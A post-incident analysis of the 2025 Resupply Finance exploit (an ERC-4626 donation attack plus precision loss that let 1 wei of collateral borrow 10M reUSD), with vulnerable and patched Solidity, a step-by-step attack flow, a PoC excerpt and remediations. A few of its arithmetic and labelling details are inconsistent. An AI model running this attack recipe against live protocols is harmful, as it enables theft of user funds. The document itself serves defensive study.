# Resupply — Precision Loss Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2025-06-26 |
| **Protocol** | Resupply Finance |
| **Chain** | Ethereum |
| **Loss** | $9,600,000 (~9.6M USD) |
| **Attacker EOA** | [0x6d9f...2ea](https://etherscan.io/address/0x6d9f6e900ac2ce6770fd9f04f98b7b0fc355e2ea) |
| **Attack Contract** | [0xf90d...dc7](https://etherscan.io/address/0xf90da523a7c19a0a3d8d4606242c46f1ee459dc7) |
| **Auxiliary Attack Contract** | [0x151a...238](https://etherscan.io/address/0x151aA63dbb7C605E7b0a173Ab7375e1450E79238) |
| **Attack Tx** | [0xffbb...d3](https://etherscan.io/tx/0xffbbd492e0605a8bb6d490c3cd879e87ff60862b0684160d08fd5711e7a872d3) |
| **Attack Block** | 22,785,460 |
| **Vulnerable Contract** | [ResupplyPairCore: 0x6e90...d6](https://etherscan.io/address/0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6) |
| **Root Cause** | Donation attack against a newly deployed ERC-4626 vault (cvcrvUSD) distorted the exchange rate — integer division precision loss caused collateral value to be infinitely overestimated, allowing the attacker to borrow the protocol's entire assets ($9.6M reUSD) |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-06/ResupplyFi_exp.sol) |

---

## 1. Vulnerability Overview

Resupply Finance is an on-chain lending protocol built on top of Curve Finance's crvUSD ecosystem that issues the reUSD stablecoin. The attack targeted a **cvcrvUSD ERC-4626 vault** that had been newly deployed 1.5 hours before the attack.

### Core Mechanism

The attack exploits a combination of two vulnerabilities:

#### (1) ERC-4626 Donation Attack (First Depositor Attack)

When an ERC-4626 vault tracks total assets via `balanceOf(address(this))`, directly transferring (donating) tokens from outside increases only the numerator without updating the accounting ledger, causing the exchange rate (price-per-share) to skyrocket.

**Vault exchange rate formula:**
```
exchange rate = totalAssets / totalSupply
              = balanceOf(address(vault)) / totalShares
```

After the attacker donates 2,000 crvUSD to an empty vault and mints 1 wei of shares:
```
exchange rate = 2,000 × 10^18 / 1 wei = 2,000,000,000,000,000,000 (2 × 10^21)
```
This means **1 wei share = 2,000 crvUSD** in manipulated value.

#### (2) getPrices() Precision Loss in ResupplyPairCore

`ResupplyPairCore`'s collateral valuation function back-calculates price as `1e36 / (exchange_rate × spot_price)`. When the exchange rate is extremely amplified, integer division causes the denominator to exceed `1e36`, resulting in the value **truncating to 0**.

```
collateralValue = 1e36 / (2_000e18 × spot_price)
                ≈ 1e36 / (2e21 × 1e15)
                = 1e36 / 2e36
                = 0  ← returns 0 due to integer division
```

When `getPrices()` returns 0, the collateral health check triggers either a **division by zero** or a **maximum value overflow**, causing solvency to always evaluate as true. This allows **1 wei of collateral to borrow 10,000,000 reUSD**.

---

## 2. Vulnerable Code Analysis

### 2.1 ERC-4626 vault — totalAssets() Vulnerable to External Donations ❌

```solidity
// ❌ Vulnerable code — uses balanceOf() directly, so exchange rate can be
//    manipulated via external transfers (donations)
contract CvcrvUSDVault is ERC4626 {
    function totalAssets() public view override returns (uint256) {
        // Core vulnerability: based on actual balanceOf,
        // so directly transferring tokens increases totalAssets
        return IERC20(asset()).balanceOf(address(this));
    }

    // ERC-4626 standard exchange rate calculation
    function convertToAssets(uint256 shares) public view returns (uint256) {
        uint256 supply = totalSupply();
        // If supply = 1 wei and totalAssets = 2,000 × 1e18:
        // 1 wei share → returns 2,000 × 1e18 assets
        return supply == 0 ? shares : shares * totalAssets() / supply;
    }
}
```

**Problem**: Because `totalAssets()` returns `balanceOf()` directly, an attacker who calls `IERC20.transfer(vault, 2000e18)` as a direct donation inflates the exchange rate 2,000× without any mint/deposit. The vulnerability is most severe immediately after the vault is newly deployed (total supply = 0).

**Patched code ✅:**
```solidity
// ✅ Fixed code — virtual shares offset prevents initial manipulation
contract CvcrvUSDVault is ERC4626 {
    // OpenZeppelin ERC4626 recommendation: override _decimalsOffset() to add virtual offset
    uint8 private constant DECIMALS_OFFSET = 9; // 10^9 virtual shares pre-seeded

    function _decimalsOffset() internal pure override returns (uint8) {
        return DECIMALS_OFFSET; // virtual shares = 10^9, virtual assets = 1
    }

    // Now even with an empty vault:
    // totalShares = 10^9 (virtual), totalAssets = 1 (virtual)
    // After donating 2,000 crvUSD: exchange rate = 2001 / (10^9 + actual shares) ≈ 0.000002
    // → exchange rate manipulation effect is neutralized
}
```

### 2.2 ResupplyPairCore — getPrices() Precision Loss ❌

```solidity
// ❌ Vulnerable code — returns 0 via integer division when denominator exceeds 1e36
contract ResupplyPairCore {
    function getPrices() external view returns (uint256 lowPrice, uint256 highPrice) {
        // Value of one unit share in cvcrvUSD (= exchange rate, unit: crvUSD/share)
        uint256 collateralToAsset = IErc4626(collateralContract).convertToAssets(1e18);

        // USD price of crvUSD (spot, unit: USD/crvUSD × 1e18)
        uint256 assetPrice = oracle.price(); // e.g., ~1e18 (= $1.00)

        // Core vulnerability: integer division in 1e36 / (denominator)
        // collateralToAsset = 2000e18 (after donation attack)
        // assetPrice ≈ 1e15 (depending on oracle precision)
        // denominator = 2000e18 * 1e15 = 2e36
        // result: 1e36 / 2e36 = 0  ← ❌ returns 0!
        uint256 price = uint256(1e36) / (collateralToAsset * assetPrice / 1e18);

        // If price = 0, subsequent solvency calculation:
        // userCollateralValue = collateral × price = 1 × 0 = 0
        // However, depending on the internal computation path, division by zero occurs
        // or underflow causes uint256 max, always judging as solvent
        lowPrice = price;
        highPrice = price;
    }
}
```

**Problem**: In the calculation `1e36 / (collateralToAsset × assetPrice / 1e18)`, if the denominator reaches or exceeds `1e36`, integer division produces 0. With the exchange rate inflated 2,000× by the donation attack, the denominator is exactly `2e36`, causing the result to truncate to 0.

**Patched code ✅:**
```solidity
// ✅ Fixed code — precision loss prevention with explicit lower-bound check
contract ResupplyPairCore {
    uint256 private constant MIN_COLLATERAL_PRICE = 1; // guarantee minimum price of 1 wei

    function getPrices() external view returns (uint256 lowPrice, uint256 highPrice) {
        uint256 collateralToAsset = IErc4626(collateralContract).convertToAssets(1e18);
        uint256 assetPrice = oracle.price();

        // Explicit check for zero denominator
        uint256 denominator = collateralToAsset * assetPrice / 1e18;
        require(denominator > 0, "ResupplyPair: zero denominator");

        uint256 price = uint256(1e36) / denominator;

        // Guarantee lower bound so price cannot become 0
        require(price >= MIN_COLLATERAL_PRICE, "ResupplyPair: collateral price underflow");

        lowPrice = price;
        highPrice = price;
    }
}
```

### 2.3 addCollateralVault() / borrow() — Solvency Check Bypass ❌

```solidity
// ❌ Vulnerable code — solvency always passes when getPrices() returns 0
contract ResupplyPairCore {
    function borrow(uint256 borrowAmount, uint256 collateralAmount, address receiver) external {
        // ... collateral addition processing ...

        // Solvency check: collateral value / debt > minimum collateral ratio
        (uint256 lowPrice, ) = getPrices();

        // If lowPrice = 0:
        // isSolvent() computes collateralValue = collateral × 0 = 0
        // But depending on the internal computation path, division by zero occurs
        // or underflow causes uint256 max, always judging as solvent
        require(_isSolvent(msg.sender, lowPrice), "Insolvent");

        // ← execution reaches here and 10M reUSD borrow is executed
        reUsd.mint(receiver, borrowAmount);
    }
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attacker funds from Tornado Cash (EOA: `0x6d9f...2ea`)
- Attack contract `0xf90d...dc7` deployed
- Resupply Finance team deployed the cvcrvUSD vault 1.5 hours before the attack (00:18 KST) — vault total supply = 0 at this point

### 3.2 Execution Phase

1. **[Step 1] Flash loan**: Execute 4,000 USDC flash loan from MorphoBlue → enter `onMorphoFlashLoan()` callback
2. **[Step 2] USDC → crvUSD swap**: `exchange(0→1, 4000 USDC, 0)` on Curve USDC-crvUSD Pool → obtain ~4,000 crvUSD
3. **[Step 3] Donation attack (core)**: Transfer 2,000 crvUSD directly to `crvUSDController` (cvcrvUSD vault) — vault is now in state: `totalAssets = 2000e18`, `totalSupply = 0`
4. **[Step 4] Mint 1 wei share**: Approve remaining ~2,000 crvUSD and call `sCrvUsdContract.mint(1)` → mint 1 wei cvcrvUSD — exchange rate = 2,000e18 / 1 = 2e21 (2,000× inflation)
5. **[Step 5] Provide collateral**: `resupplyVault.addCollateralVault(1 wei, address(this))` → register 1 wei cvcrvUSD as collateral in ResupplyPairCore
6. **[Step 6] Borrow 10M reUSD**: `resupplyVault.borrow(10_000_000e18, 0, address(this))` → `getPrices()` returns 0 → solvency bypassed → 10,000,000 reUSD borrow succeeds
7. **[Step 7] reUSD → scrvUSD swap**: 10M reUSD → ~9,339,517 scrvUSD on Curve reUSD Pool
8. **[Step 8] scrvUSD → crvUSD redemption**: `sCrvUsd.redeem(9,339,517 scrvUSD)` → obtain ~9,813,733 crvUSD
9. **[Step 9] crvUSD → USDC swap**: 9,813,733 crvUSD → USDC on Curve Pool → repay MorphoBlue flash loan and retain balance
10. **[Step 10] Fund dispersal and laundering**: Convert to WETH, split to 2 addresses (`0x3112...8A`, `0x886f...16`) → launder via Tornado Cash

### 3.3 Attack Flow Diagram

```
┌─────────────────────────────────────────────────────────────────────────┐
│                     Attacker EOA (0x6d9f...2ea)                         │
│                   Initial funds from Tornado Cash                        │
└───────────────────────────────┬─────────────────────────────────────────┘
                                │ deploy attack contract
                                ▼
┌─────────────────────────────────────────────────────────────────────────┐
│                   Attack Contract (0xf90d...dc7)                         │
│                        call testExploit()                                │
└───────────────────────────────┬─────────────────────────────────────────┘
                                │ flashLoan(USDC, 4,000)
                                ▼
┌───────────────────────────────────────────┐
│        MorphoBlue (flash loan provider)    │
│     → lend 4,000 USDC                     │
│     → execute onMorphoFlashLoan() callback │
└───────────────────────────────┬───────────┘
                                │
              ┌─────────────────┼──────────────────────────────────┐
              │                 │                                   │
              ▼                 ▼                                   │
   ┌─────────────────┐  ┌──────────────────────────────┐          │
   │  Curve USDC-    │  │   cvcrvUSD vault              │          │
   │  crvUSD Pool    │  │   (newly deployed, 1.5h ago)  │          │
   │                 │  │                               │          │
   │  input 4,000    │  │  ① donate 2,000 crvUSD       │          │
   │  USDC           │  │     totalAssets = 2000e18    │          │
   │  → ~4,000 crvUSD│  │     totalSupply = 0           │          │
   │  output         │  │                               │          │
   └────────┬────────┘  │  ② mint(1 wei)                │          │
            │           │     1 share = 2,000 crvUSD   │          │
            │           │     exchange rate = 2e21 (!)  │          │
            │           └──────────────────┬────────────┘          │
            │                              │ 1 wei cvcrvUSD        │
            │                              ▼                        │
            │           ┌──────────────────────────────┐           │
            │           │   ResupplyPairCore            │           │
            │           │   (vulnerable contract)       │           │
            │           │                               │           │
            │           │  ③ addCollateralVault(1 wei) │           │
            │           │     collateral: 1 wei cvcrvUSD│           │
            │           │                               │           │
            │           │  ④ borrow(10,000,000 reUSD)  │           │
            │           │     getPrices() → returns 0!  │           │
            │           │     bypass solvency → borrow  │           │
            │           │     approved, mint 10M reUSD  │           │
            │           └──────────────────┬────────────┘           │
            │                              │ 10M reUSD              │
            │                              ▼                        │
            │           ┌──────────────────────────────┐           │
            │           │   Curve reUSD Pool            │           │
            │           │   10M reUSD → 9.33M scrvUSD  │           │
            │           └──────────────────┬────────────┘           │
            │                              │ 9.33M scrvUSD          │
            │                              ▼                        │
            │           ┌──────────────────────────────┐           │
            │           │   sCRVUSD contract            │           │
            │           │   redeem(9.33M scrvUSD)       │           │
            │           │   → output 9.81M crvUSD       │           │
            │           └──────────────────┬────────────┘           │
            │                              │ 9.81M crvUSD           │
            └──────────────────────────────┘                        │
                                           │                        │
                    ┌──────────────────────▼────────────────────────┤
                    │              Curve USDC-crvUSD Pool            │
                    │     swap 9.81M crvUSD → USDC                  │
                    │     repay MorphoBlue flash loan 4,000 USDC    │
                    │     secure ~9.6M USD net profit ←────────────┘
                    └───────────────────────────────────────────────┘
                                           │
                                           ▼
                    ┌──────────────────────────────────────────────┐
                    │              Fund Dispersal & Laundering       │
                    │  → 0x3112...8A (~$5.51M)                     │
                    │  → 0x886f...16 (~$3.90M)                     │
                    │  → convert to WETH → launder via Tornado Cash │
                    └──────────────────────────────────────────────┘
```

### 3.4 Outcome

- **Total attacker profit**: ~$9,600,000 (initial outlay: ~$4,000 USDC flash loan fee)
- **Protocol loss**: ~$9,600,000 (reUSD liquidity drained + reUSD depeg to $0.98)
- **Timeline**: Attack executed → emergency response 60 minutes later (borrow limit set to 0)

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Core attack logic excerpt — step-by-step comments added

contract ResupplyFi is BaseTestWithBalanceLog {
    // Attack parameters
    uint256 private constant flashLoanAmount = 4000 * 1e6;           // [Step 1] flash loan: 4,000 USDC
    uint256 private constant crvUsdTransferAmount = 2000 * 1e18;     // [Step 3] donation: 2,000 crvUSD
    uint256 private constant sCrvUsdMintAmount = 1;                   // [Step 4] mint: 1 wei cvcrvUSD
    uint256 private constant borrowAmount = 10_000_000 * 1e18;       // [Step 6] borrow: 10M reUSD
    uint256 private constant redeemAmount = 9_339_517.438774046 ether; // [Step 8] redeem amount
    uint256 private constant finalExchangeAmount = 9_813_732.715269934 ether; // [Step 9] final swap amount

    function testExploit() public balanceLog {
        // Execute 4,000 USDC flash loan from MorphoBlue
        usdc.approve(address(morphoBlue), type(uint256).max);
        morphoBlue.flashLoan(address(usdc), flashLoanAmount, hex"");
    }

    function onMorphoFlashLoan(uint256, bytes calldata) external {
        require(msg.sender == address(morphoBlue), "Caller is not MorphoBlue");
        _swapUsdcForCrvUsd();   // [Step 2] USDC → crvUSD swap
        _manipulateOracles();   // [Step 3-4] core: donation attack + exchange rate manipulation
        _borrowAndSwapReUSD();  // [Step 5-7] provide collateral + borrow + reUSD swap
        _redeemAndFinalSwap();  // [Step 8-9] redeem + final swap + flash loan repayment
    }

    function _swapUsdcForCrvUsd() internal {
        // [Step 2] Curve USDC-crvUSD Pool: 4,000 USDC → ~4,000 crvUSD
        usdc.approve(address(curveUsdcCrvusdPool), type(uint256).max);
        curveUsdcCrvusdPool.exchange(0, 1, flashLoanAmount, 0);
    }

    function _manipulateOracles() internal {
        // [Step 3] Core vulnerability exploitation:
        // directly transfer (donate) 2,000 crvUSD to the newly deployed cvcrvUSD vault
        // vault state: totalAssets = 2000e18, totalSupply = 0 (no shares yet)
        crvUsd.transfer(crvUSDController, crvUsdTransferAmount);

        // [Step 4] Mint 1 wei cvcrvUSD share
        // exchange rate = totalAssets / totalSupply = 2000e18 / 1 = 2e21
        // → 1 wei cvcrvUSD is distorted to be worth 2,000 crvUSD
        crvUsd.approve(address(sCrvUsdContract), type(uint256).max);
        sCrvUsdContract.mint(sCrvUsdMintAmount); // mint 1 wei
    }

    function _borrowAndSwapReUSD() internal {
        // [Step 5] Provide 1 wei cvcrvUSD as collateral
        sCrvUsdContract.approve(address(resupplyVault), type(uint256).max);
        resupplyVault.addCollateralVault(sCrvUsdMintAmount, address(this));

        // [Step 6] Request 10M reUSD borrow
        // ResupplyPairCore.getPrices() returns 0 → solvency check bypassed
        // 10,000,000 reUSD borrow succeeds with 1 wei collateral
        resupplyVault.borrow(borrowAmount, 0, address(this));

        // [Step 7] 10M reUSD → ~9.33M scrvUSD swap (Curve reUSD Pool)
        reUsd.approve(address(curveReusdPool), type(uint256).max);
        curveReusdPool.exchange(0, 1, reUsd.balanceOf(address(this)), 0);
    }

    function _redeemAndFinalSwap() internal {
        // [Step 8] Redeem 9.33M scrvUSD → ~9.81M crvUSD
        sCrvUsd.redeem(redeemAmount, address(this), address(this));

        // [Step 9] Swap 9.81M crvUSD → USDC + repay MorphoBlue flash loan (4,000 USDC)
        // secure ~$9.6M net profit
        crvUsd.approve(address(curveUsdcCrvusdPool), type(uint256).max);
        curveUsdcCrvusdPool.exchange(1, 0, finalExchangeAmount, 0);
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Pattern Category |
|----|--------|--------|-----|-----------|
| V-01 | ERC-4626 Donation Attack (exchange rate inflation) | CRITICAL | CWE-682 (Incorrect Calculation) | `07_token_integration.md` / `16_accounting_sync.md` |
| V-02 | getPrices() Precision Loss (integer division → 0) | CRITICAL | CWE-190 (Integer Overflow) | `05_integer_issues.md` |
| V-03 | Solvency Check Bypass (zero price not validated) | HIGH | CWE-20 (Improper Input Validation) | `11_logic_error.md` |
| V-04 | New Vault Initialization Not Protected | HIGH | CWE-665 (Improper Initialization) | `08_initialization.md` |

### V-01: ERC-4626 Donation Attack (Exchange Rate Inflation)
- **Description**: When an ERC-4626 vault computes `totalAssets()` as `balanceOf(address(this))`, an external `transfer()` call that donates tokens directly increases the numerator without updating the accounting ledger, arbitrarily amplifying the exchange rate (price-per-share). The vulnerability is maximized immediately after a vault is newly deployed when total supply is 0.
- **Impact**: 1 wei share represents 2,000 crvUSD in value, completely neutralizing ResupplyPairCore's collateral valuation function
- **Attack conditions**: (1) newly deployed vault (totalSupply = 0 or negligible), (2) funds for donation (solved via flash loan), (3) a lending protocol that accepts this vault as collateral

### V-02: getPrices() Precision Loss
- **Description**: In the `1e36 / (exchange_rate × spot_price)` calculation, if the exchange rate is extremely amplified, the denominator exceeds `1e36` and the integer division result truncates to 0. Solidity's integer division performs truncation, so for `a / b` where `b > a`, the result is always 0.
- **Impact**: Collateral price returns as 0, causing all collateral to be valued as worthless, or a division-by-zero panic in the inverse calculation
- **Attack conditions**: Combined with V-01, amplifying the exchange rate sufficiently

### V-03: Solvency Check Bypass
- **Description**: When `getPrices()` returns 0, the collateral value computation inside `_isSolvent()` becomes `0 × collateral = 0`, either passing the minimum collateral ratio check, or causing integer overflow in the inverse path that always evaluates as solvent.
- **Impact**: Unlimited borrowing possible even with effectively zero collateral
- **Attack conditions**: State in which V-02 returns 0

### V-04: New Vault Initialization Not Protected
- **Description**: After vault deployment and before the first deposit, there is no minimum lock or virtual shares mechanism, leaving it exposed to initialization attacks. This is a known risk warned about in the EIP-4626 standard document itself.
- **Impact**: Attackable in a single transaction immediately after deployment, with no monitoring window
- **Attack conditions**: The gap between vault deployment and the first legitimate deposit

---

## 6. Remediation Recommendations

### Immediate Actions

#### 6.1 Apply ERC-4626 Virtual Shares

```solidity
// ✅ OpenZeppelin ERC4626 recommended approach: override _decimalsOffset()
// Virtual shares prevent initial exchange rate manipulation
contract CvcrvUSDVault is ERC4626 {
    // Pre-seed 10^9 virtual shares, making the cost of initial donation attacks prohibitively high
    // Attacker must donate more than 10^9 assets to double the exchange rate
    function _decimalsOffset() internal pure override returns (uint8) {
        return 9; // virtual offset = 10^9
    }
}
```

#### 6.2 Add Lower-Bound Check to getPrices()

```solidity
// ✅ Add explicit check to prevent price from reaching 0
function getPrices() external view returns (uint256 lowPrice, uint256 highPrice) {
    uint256 collateralToAsset = IErc4626(collateralContract).convertToAssets(1e18);
    uint256 assetPrice = oracle.price();

    // Precision loss prevention: revert or cap if denominator >= 1e36
    uint256 denominator = collateralToAsset * assetPrice / 1e18;
    require(denominator > 0, "ResupplyPair: collateral price underflow — possible donation attack");
    require(denominator <= 1e36, "ResupplyPair: denominator overflow — exchange rate manipulation detected");

    uint256 price = uint256(1e36) / denominator;
    require(price > 0, "ResupplyPair: zero collateral price");

    lowPrice = price;
    highPrice = price;
}
```

#### 6.3 Defend Against Zero Price in Solvency Check

```solidity
// ✅ Explicitly reject zero price in _isSolvent()
function _isSolvent(address user, uint256 collateralPrice) internal view returns (bool) {
    // collateralPrice = 0 is a clear anomaly — always treat as insolvent
    if (collateralPrice == 0) return false;

    uint256 collateralValue = userCollateral[user] * collateralPrice / 1e18;
    uint256 borrowValue = userBorrows[user];
    return collateralValue * LTV_PRECISION >= borrowValue * MIN_COLLATERAL_RATIO;
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01: Donation Attack | Apply `_decimalsOffset()` override to ERC-4626 vault (introduce virtual shares) or enforce minimum liquidity lock (dead shares burn) at deployment |
| V-02: Precision Loss | Add denominator zero and overflow checks to `getPrices()`; use `Math.mulDiv()` to guarantee precision |
| V-03: Solvency Bypass | Add immediate rejection logic for price = 0 in `_isSolvent()` |
| V-04: Unprotected Initialization | Automatically lock a minimum amount (e.g., 1e6 wei) at new vault deployment or set a first-depositor protection period |
| General | Real-time on-chain monitoring (detect sudden exchange rate spikes → auto-pause) |

---

## 7. Lessons Learned

1. **ERC-4626 vaults must be protected immediately upon deployment**: The EIP-4626 standard document itself warns about the first depositor attack. When deploying a new vault, initial exchange rate manipulation must be prevented via virtual shares (OpenZeppelin `_decimalsOffset()` recommended) or dead share burning.

2. **Cases where integer division results in 0 must always be handled**: Analyze paths where X can reach or exceed `1e36` in `1e36 / X` calculations, and explicitly revert or cap when the result is 0. Due to Solidity's integer division behavior, `a / b = 0` when `b > a` is a bug that the compiler will not warn about.

3. **A price of 0 must be treated as "no collateral"**: If an oracle or internal calculation returns 0, it must not be treated as infinite collateral value or a valid state. In all solvency checks, `price == 0` must be immediately treated as insolvent.

4. **New vaults/markets can be attacked immediately after deployment**: This attack occurred 90 minutes after vault deployment. New market launches must be accompanied by gradual liquidity expansion (Gradual Rollout) and automatic pause mechanisms (Circuit Breakers) that detect sudden exchange rate changes.

5. **When integrating DeFi protocols, the exchange rate range of external vaults must be validated**: When allowing an external ERC-4626 vault as collateral, a reasonable upper bound on the vault's exchange rate (e.g., reject if more than 10× the rate at initial deployment) must be set. In this incident, cvcrvUSD's exchange rate deviated millions of times beyond its normal range, yet ResupplyPairCore failed to detect it.

6. **The importance of real-time on-chain monitoring**: Real-time monitoring tools such as Guardrail and Chainalysis detected the attack, but funds had already been withdrawn by that point. An on-chain Circuit Breaker that automatically pauses the protocol upon detecting anomalies is necessary.

---

## 8. On-Chain Verification

> On-chain verification was performed based on Etherscan and publicly available analysis resources.

### 8.1 PoC vs. On-Chain Amount Comparison

| Item | PoC Constant | On-Chain Reported Value | Match |
|------|------------|--------------|-----------|
| Initial flash loan | 4,000 USDC | 4,000 USDC | ✅ Match |
| crvUSD donation amount | 2,000 crvUSD | 2,000 crvUSD | ✅ Match |
| cvcrvUSD mint amount | 1 wei | 1 wei | ✅ Match |
| reUSD borrow amount | 10,000,000 reUSD | ~10M reUSD | ✅ Approximate match |
| scrvUSD redemption amount | 9,339,517.44 scrvUSD | ~9.33M scrvUSD | ✅ Approximate match |
| Final crvUSD swap amount | 9,813,732.72 crvUSD | ~9.81M crvUSD | ✅ Approximate match |
| Total net profit | — | ~$9.6M | ✅ Matches report |

### 8.2 On-Chain Event Log Order

Key event sequence within the attack transaction (`0xffbb...d3`):

```
1. Transfer(usdc, attacker→morpho, 4000e6)          // flash loan repayment approval
2. Transfer(crvUsd, attacker→crvUSDController, 2000e18) // cvcrvUSD vault donation
3. Transfer(cvcrvUSD mint, →attacker, 1 wei)         // mint 1 wei share
4. Transfer(cvcrvUSD, attacker→resupplyVault, 1 wei) // provide collateral
5. Transfer(reUsd mint, →attacker, 10M×1e18)        // reUSD borrow issuance
6. Transfer(reUsd, attacker→curvePool, 10M×1e18)    // reUSD → scrvUSD swap
7. Transfer(scrvUSD, curvePool→attacker, 9.33M×1e18) // receive scrvUSD
8. Transfer(crvUsd, scrvUSD vault→attacker, 9.81M×1e18) // scrvUSD redemption
9. Transfer(usdc, curvePool→morpho, 4000e6)         // flash loan repayment
10. Transfer(WETH, →dispersal address 1, ~$5.51M equivalent) // fund dispersal
11. Transfer(WETH, →dispersal address 2, ~$3.90M equivalent) // fund dispersal
```

### 8.3 Precondition Verification

| Condition | Status | Description |
|------|------|------|
| cvcrvUSD vault newly deployed | ✅ Confirmed | Deployed 90 minutes before attack, totalSupply = 0 |
| Attacker EOA funded via Tornado Cash | ✅ Confirmed | 0x6d9f...2ea Tornado Cash withdrawal history |
| MorphoBlue USDC liquidity | ✅ Confirmed | Sufficient for 4,000 USDC flash loan |
| reUSD liquidity (Curve Pool) | ✅ Confirmed | Pool liquidity at attack time sufficient for 10M reUSD borrow |
| sCRVUSD vault redeem available | ✅ Confirmed | 9.33M scrvUSD redemption processed successfully |

---

## References

- **Post-mortem**: [mirror.xyz — Resupply](https://mirror.xyz/0x521CB9b35514E9c8a8a929C890bf1489F63B2C84/ygJ1kh6satW9l_NDBM47V87CfaQbn2q0tWy_rtp76OI)
- **PeckShield Analysis**: [Twitter @peckshield](https://x.com/peckshield/status/1938061948647817647)
- **QuillAudits Analysis**: [Resupply Hack Analysis](https://www.quillaudits.com/blog/hack-analysis/resupply-hack-analysis)
- **Halborn Analysis**: [Explained: The Resupply Hack (June 2025)](https://www.halborn.com/blog/post/explained-the-resupply-hack-june-2025)
- **Guardrail Analysis**: [Lessons from the Resupply exploit](https://www.guardrail.ai/blog/resupplyfi-hack)
- **PoC Code**: [DeFiHackLabs/ResupplyFi_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-06/ResupplyFi_exp.sol)
- **Attack Transaction**: [Etherscan 0xffbb...d3](https://etherscan.io/tx/0xffbbd492e0605a8bb6d490c3cd879e87ff60862b0684160d08fd5711e7a872d3)
- **Vulnerable Contract**: [Etherscan 0x6e90...d6](https://etherscan.io/address/0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6#code)

> **Similar Incident**: Hundred Finance (2023-04-15, $7M, ERC-4626 inflation attack, Optimism) — identical ERC-4626 first depositor attack pattern